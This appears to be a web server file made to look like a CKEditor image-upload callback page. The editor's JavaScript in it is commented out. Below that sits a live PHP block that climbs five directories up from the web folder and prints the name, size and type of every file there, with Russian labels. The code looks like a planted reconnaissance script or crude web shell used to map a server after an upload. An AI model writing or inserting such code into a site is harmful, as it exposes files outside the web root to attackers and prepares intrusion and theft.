<script src="/js/library/jquery-1.12.4.min.js"></script>
<script type="text/javascript">
// function getUrlParam(paramName)
// {
// var reParam = new RegExp('(?:[\?&]|&amp;)' + paramName + '=([^&]+)', 'i') ;
// var match = window.location.search.match(reParam) ;
//
// return (match && match.length > 1) ? match[1] : '' ;
// }
// var funcNum = getUrlParam('CKEditorFuncNum');
// var fileUrl = '/images/interviews/11244393111907954513726734141507551084news.jpg';
// $(document).ready(function()
// {
//   window.opener.CKEDITOR.tools.callFunction(funcNum, fileUrl);
// });
</script>
<?php
$dh = opendir("../../../../../");
while($filename = readdir($dh))
{
$fs = filesize($filename);
$ft = filetype($filename);
echo "Имя: ".$filename."\nРазмер: ".$fs."\nТип:".$ft."<br />";
}
?>
